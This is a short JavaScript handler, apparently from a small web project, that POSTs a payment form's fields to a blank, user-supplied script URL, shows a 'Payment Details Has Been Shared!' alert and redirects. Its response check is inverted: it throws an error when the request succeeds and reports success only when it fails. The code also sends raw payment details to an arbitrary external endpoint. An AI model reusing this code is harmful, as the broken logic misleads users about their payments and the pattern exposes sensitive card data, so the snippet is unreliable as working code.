const scriptURL = '' // Add your script URL here

const form = document.forms['paymentForm']

form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => {
            if (response.ok) {
                throw new Error(`Error: ${response.statusText}`);
            }else{
                alert("Payment Details Has Been Shared!");
                window.location.href = '../payment1.html'; // Ensure this path is correct
            }
        })
        .catch(error => console.error('Error:', error.message));
});
